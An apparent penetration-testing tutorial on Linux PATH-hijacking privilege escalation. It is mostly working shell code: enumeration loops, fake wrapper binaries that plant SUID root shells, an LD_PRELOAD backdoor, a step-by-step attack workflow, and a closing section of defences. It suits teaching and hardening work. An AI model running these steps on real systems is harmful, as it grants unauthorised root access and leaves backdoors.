## PATH Hijacking for Privilege Escalation

PATH hijacking exploits the way Linux searches for executables when a command is called **without an absolute path**. If a root-owned process or script calls a command like `ls` instead of `/bin/ls`, an attacker can manipulate the `PATH` environment variable to execute a malicious binary with root privileges instead.

---

### 1. Understanding PATH

**What is PATH?**
- Environment variable that tells the shell where to look for executables
- Colon-separated list of directories: `/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin`
- Search order is **left to right** (first match wins)
- Critical for privilege escalation when root processes rely on it

**View Current PATH**:
```bash
echo $PATH
# Output: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**How Command Resolution Works**:
```bash
# When you type 'ls', the system:
# 1. Checks if 'ls' is an alias/built-in
# 2. Searches PATH directories in order:
#    /usr/local/sbin/ls (not found)
#    /usr/local/bin/ls (not found)
#    /usr/sbin/ls (not found)
#    /usr/bin/ls (found! executes this)
```

---

### 2. Enumeration: Identifying PATH Hijacking Opportunities

**Check Current PATH**:
```bash
echo $PATH | tr ':' '\n' | nl
# Shows each directory with priority
```

**Find Writable Directories in PATH**:
```bash
# Check if any PATH directory is writable by current user
for dir in $(echo $PATH | tr ':' ' '); do
    if [ -w "$dir" ]; then
        echo "[WRITABLE] $dir"
    fi
done
```

**Check for Relative Paths in Cron Jobs**:
```bash
# Look for commands without absolute paths
cat /etc/crontab | grep -v '^#' | grep -v '^$'
# Example: * * * * * root backup_script  # Uses PATH!

# Examine cron scripts
grep -r " [a-z]" /etc/cron* | grep -v "^#" | grep -v "full path"
```

**Find Scripts with Dangerous Commands**:
```bash
# Search for common commands without full paths
grep -r "cp " /etc/init.d/ 2>/dev/null
grep -r "mv " /etc/init.d/ 2>/dev/null
grep -r "rm " /etc/init.d/ 2>/dev/null
grep -r "chmod " /etc/init.d/ 2>/dev/null
grep -r "chown " /etc/init.d/ 2>/dev/null
```

**Check SUID Binaries' Dependencies**:
```bash
# Find SUID binaries that call external commands
strings /path/to/suid_binary | grep -E "^[a-z]+$"
# Look for 'system("command")' or 'execvp("command")'
```

**Automated Tools**:
```bash
# LinPEAS PATH checks
./linpeas.sh | grep -A 10 "PATH"

# Manual comprehensive check
for script in $(find /etc/cron* /etc/init.d/ -type f 2>/dev/null); do
    echo "=== $script ==="
    grep -E "(^|[^/])[a-zA-Z0-9_-]+" $script | grep -v "/" | head -10
done
```

---

### 3. Exploitation Techniques

#### A. Writable PATH Directory Hijack (Most Common)

If a directory in PATH is writable, put a malicious binary with the same name as a command root uses.

**Exploitation**:
```bash
# 1. Check which PATH directories are writable
for dir in $(echo $PATH | tr ':' ' '); do
    if [ -w "$dir" ]; then
        echo "[+] Writable: $dir"
    fi
done

# 2. Find a command called by root without absolute path
# Example: Cron job does: backup_script (not /usr/local/bin/backup_script)

# 3. Create malicious binary in the *earliest* writable PATH directory
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
# Execute the real command to avoid breaking functionality
/usr/bin/backup_script "$@"' > /usr/local/bin/backup_script

chmod +x /usr/local/bin/backup_script

# 4. Wait for cron/root to execute
# 5. /tmp/rootbash -p gives root
```

**Priority Matters**:
```bash
# If PATH is: /usr/local/bin:/usr/bin:/bin
# And /usr/local/bin is writable, create malicious binary there
# If not, check /usr/bin, /bin (usually not writable)

# To see exact PATH used by cron:
cat /etc/crontab | grep PATH
# You can also check: sudo crontab -l | grep PATH
```

---

#### B. Adding New PATH Directory (If Cron Uses System PATH)

If you can't modify existing PATH directories, but cron uses a **writable** directory that's not in PATH (and you can add it).

**Exploitation**:
```bash
# 1. Create writable directory
mkdir /tmp/bin
chmod 755 /tmp/bin

# 2. Modify PATH for cron (if using /etc/crontab)
echo "PATH=/tmp/bin:$PATH" >> /etc/crontab
# Or if using cron.d files
echo "PATH=/tmp/bin:/usr/local/bin:/usr/bin:/bin" > /etc/cron.d/path

# 3. Place malicious binary
cat > /tmp/bin/backup << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/shell
chmod +s /tmp/shell
EOF
chmod +x /tmp/bin/backup

# 4. Wait for execution
```

**Note**: This requires writing to `/etc/crontab` (usually root-only). More common in misconfigured systems where cron.d is writable.

---

#### C. User-Specific PATH Manipulation

If a user can modify their own `.bashrc` or `.profile`, and root executes commands as that user (or sudo -u), PATH hijacking works.

**Exploitation**:
```bash
# Modify user's .bashrc
echo 'export PATH=/tmp/bin:$PATH' >> ~/.bashrc

# Create malicious binary
mkdir /tmp/bin
echo '#!/bin/bash
chmod +s /bin/bash' > /tmp/bin/ls
chmod +x /tmp/bin/ls

# Wait for root to execute a command as this user
sudo -u user some_command
# Or if root su's to this user
```

---

#### D. Symlink Attacks on PATH Directories

If a PATH directory is writable but you can't create files (e.g., parent permissions), symlinks might work.

**Exploitation**:
```bash
# If /usr/local/bin is writable but you can't write files
# Create symlink to your malicious script in another location
ln -s /tmp/backdoor.sh /usr/local/bin/backup

# Or if you can't write to /usr/local/bin at all, but can write to parent
# symlink the whole directory
ln -s /tmp/fake_bin /usr/local/bin
```

---

#### E. Exploiting SUID Binaries with PATH Dependencies

Some SUID binaries spawn processes using system commands without absolute paths.

**Exploitation**:
```bash
# 1. Find SUID binary that uses system()
find / -perm -4000 -type f -exec strings {} \; 2>/dev/null | grep -E "system|exec|popen"

# 2. Example: /usr/bin/suid_binary does: system("ls -la /tmp");

# 3. Create malicious 'ls' in writable PATH directory
echo '#!/bin/bash
chmod +s /bin/bash
# Execute real ls to maintain functionality
/bin/ls "$@"' > /tmp/ls
chmod +x /tmp/ls

# 4. Add /tmp to PATH (if not already)
export PATH=/tmp:$PATH

# 5. Execute SUID binary
/usr/bin/suid_binary
# /bin/bash becomes SUID root
```

**Important**: Many modern SUID binaries sanitize PATH and ignore environment variables. But older or poorly written ones are vulnerable.

---

#### F. Cron with Relative Paths in Scripts

Many cron scripts use relative paths internally.

**Example Vulnerable Script**:
```bash
#!/bin/bash
# /usr/local/bin/backup.sh
cd /var/www
tar -czf backup.tar.gz *  # Actually uses 'tar' from PATH
```

**Exploitation**:
```bash
# Create malicious tar in a writable PATH directory
echo '#!/bin/bash
chmod +s /bin/bash' > /tmp/tar
chmod +x /tmp/tar

# If /tmp is in PATH before /bin:
export PATH=/tmp:$PATH
# Or if cron's PATH includes /tmp (unlikely)
```

---

#### G. Scripts with `source` or `.` Commands

If a script uses `source` or `.` to include other files without absolute paths.

**Exploitation**:
```bash
# Vulnerable script:
. config.sh  # No absolute path

# Create config.sh in writable PATH directory
echo 'chmod +s /bin/bash' > /tmp/config.sh
chmod +x /tmp/config.sh

# If /tmp in PATH, it gets sourced as root
```

---

### 4. Advanced Techniques

#### A. PATH Precedence Exploitation

Understanding PATH search order is crucial. The first match wins.

**Scenario**:
```bash
# PATH: /usr/local/bin:/usr/bin:/bin
# Root calls: backup

# Options to hijack (in order of preference):
1. /usr/local/bin/backup (if writable) - Best option
2. /usr/bin/backup (usually not writable)
3. /bin/backup (usually not writable)

# If none writable, but you can add to PATH:
# Change cron's PATH to: /tmp/bin:/usr/local/bin:/usr/bin:/bin
# Then /tmp/bin/backup takes precedence
```

**Testing Priority**:
```bash
# See which command executes first
which -a ls
# Shows all locations of 'ls' in PATH order
```

---

#### B. Exploiting Command Aliases

If root's environment includes aliases, they might be exploitable.

**Exploitation**:
```bash
# Root's .bashrc:
alias rm='rm -i'

# Attacker in writable PATH:
# Create 'rm' binary that executes backdoor first
echo '#!/bin/bash
chmod +s /bin/bash
/bin/rm "$@"' > /tmp/rm
chmod +x /tmp/rm

# If /tmp is in PATH before alias definition, it executes
```

---

#### C. LD_PRELOAD + PATH Combo

Combining PATH hijacking with LD_PRELOAD for persistent backdoors.

**Exploitation**:
```bash
# 1. Create malicious library
gcc -shared -fPIC -o /tmp/libbackdoor.so backdoor.c

# 2. Create wrapper script in writable PATH
cat > /tmp/ls << 'EOF'
#!/bin/bash
export LD_PRELOAD=/tmp/libbackdoor.so
/bin/ls "$@"
EOF
chmod +x /tmp/ls

# 3. When root uses ls, LD_PRELOAD loads malicious library
```

---

#### D. Bypassing a Restricted PATH

Sometimes cron uses a restricted PATH but scripts can modify it.

**Exploitation**:
```bash
# Script starts with:
PATH=/usr/bin:/bin

# But then does:
export PATH=$PATH:/tmp

# If /tmp is in the expanded PATH, exploit works
# Inject at the END:
export PATH=$PATH:/tmp  # Least priority, only works if command not found elsewhere

# Better to inject at START:
export PATH=/tmp:$PATH
```

---

### 5. Practical Attack Workflow

**Step 1: Enumerate PATH and Writable Directories**:
```bash
echo "=== Current PATH ==="
echo $PATH | tr ':' '\n'

echo -e "\n=== Writable PATH Directories ==="
for dir in $(echo $PATH | tr ':' ' '); do
    if [ -w "$dir" ]; then
        echo "[+] Writable: $dir"
        # Check what's already there
        ls -la "$dir" | head -10
    fi
done

echo -e "\n=== Writable Directories (not in PATH) ==="
find / -type d -writable ! -path "/proc/*" 2>/dev/null | head -20
```

**Step 2: Identify Root Processes/Commands Without Full Paths**:
```bash
# Check cron jobs
cat /etc/crontab /etc/cron.d/* 2>/dev/null | grep -v '^#' | grep -v '^$'

# Check init scripts
grep -r " [a-z]" /etc/init.d/ 2>/dev/null | grep -v "/" | head -20

# Check systemd service files
grep -r "Exec" /etc/systemd/system/*.service 2>/dev/null | grep -v "/"

# Check user scripts
find /home -name "*.sh" -exec grep -l " [a-z]" {} \; 2>/dev/null
```

**Step 3: Determine Which Commands Can Be Hijacked**:
```bash
# Extract all potential command names from cron
for file in /etc/crontab /etc/cron.d/*; do
    if [ -f "$file" ]; then
        grep -v '^#' "$file" | grep -v '^$' | awk '{print $NF}' | grep -v '/' | sort -u
    fi
done

# Extract from scripts
for script in $(find /etc/cron* -type f); do
    grep -E "(^|[^/])[a-zA-Z0-9_-]+" "$script" | grep -v "/" | grep -v "^#" | sort -u
done
```

**Step 4: Create Malicious Binary**:
```bash
# In the highest-priority writable PATH directory
TARGET="/usr/local/bin/backup"  # Example target
echo '#!/bin/bash
# Backdoor payload
cp /bin/bash /tmp/shell
chmod +s /tmp/shell
chown root:root /tmp/shell
# Execute real command to maintain functionality
/usr/bin/backup "$@"' > "$TARGET"
chmod +x "$TARGET"
```

**Step 5: Trigger Execution**:
```bash
# Wait for cron
# Or trigger manually if possible
sudo /path/to/script  # If you have sudo
# Or restart service
systemctl restart service_name
# Or wait for system boot
```

**Step 6: Verify**:
```bash
ls -la /tmp/shell
# -rwsr-sr-x 1 root root ... /tmp/shell

/tmp/shell -p
# root shell
```

---

### 6. Exploitable Scenarios

| Scenario | Exploit Method | Example |
|----------|---------------|---------|
| Writable /usr/local/bin | Place binary in /usr/local/bin | Cron calls `backup` → executes `/usr/local/bin/backup` |
| Cron PATH includes /tmp | Place binary in /tmp | If cron PATH: `PATH=/tmp:/bin` → hijack |
| User .bashrc PATH modification | Add /tmp to PATH before root su | Root `su - user` → executes malicious commands |
| SUID binary uses system() | Create command in writable PATH | `system("ls")` executes malicious ls |
| Script uses `source` without path | Create sourced file in PATH | `. config.sh` loads malicious config |
| Script modifies PATH | Inject before existing PATH | `PATH=/tmp:$PATH` → /tmp takes priority |
| Symlink attack | Symlink to writable directory | `/usr/local/bin` → `/tmp/fake_bin` |

---

### 7. Defensive Measures

**For System Administrators**:

1. **Use Absolute Paths in Scripts**:
   ```bash
   # Bad
   backup_script
   
   # Good
   /usr/local/bin/backup_script
   /bin/cp /source /dest
   /usr/bin/tar -czf backup.tar.gz /data
   ```

2. **Restrict PATH Permissions**:
   ```bash
   # Ensure PATH directories are not writable by non-root
   chmod 755 /usr/local/bin /usr/bin /bin /usr/sbin /sbin
   chown root:root /usr/local/bin /usr/bin /bin /usr/sbin /sbin
   ```

3. **Set Explicit PATH in Cron**:
   ```bash
   # /etc/crontab
   PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
   # Use only system directories
   ```

4. **Use `--` to End Options**:
   ```bash
   # Prevents arguments from being interpreted as options
   tar -czf backup.tar.gz -- /var/www/*
   ```

5. **Sanitize PATH in SUID Binaries**:
   ```bash
   # In C/C++: Use absolute paths for system() calls
   system("/bin/ls -la /tmp");  # Instead of system("ls -la /tmp");
   ```

6. **Disable Writable Directories in PATH**:
   ```bash
   # Remove user-writable directories from system PATH
   export PATH=$(echo $PATH | tr ':' '\n' | grep -v "/tmp" | grep -v "/home" | tr '\n' ':')
   ```

7. **Use AppArmor/SELinux**:
   ```bash
   # Restrict which binaries can be executed
   # AppArmor profile for cron
   ```

8. **Regular Audits**:
   ```bash
   # Check for writable PATH directories daily
   for dir in $(echo $PATH | tr ':' ' '); do
       if [ -w "$dir" ]; then
           echo "ALERT: Writable PATH: $dir"
       fi
   done
   
   # Check for missing absolute paths in scripts
   find /etc/cron* -type f -exec grep -H " [a-z]" {} \; | grep -v "/"
   ```

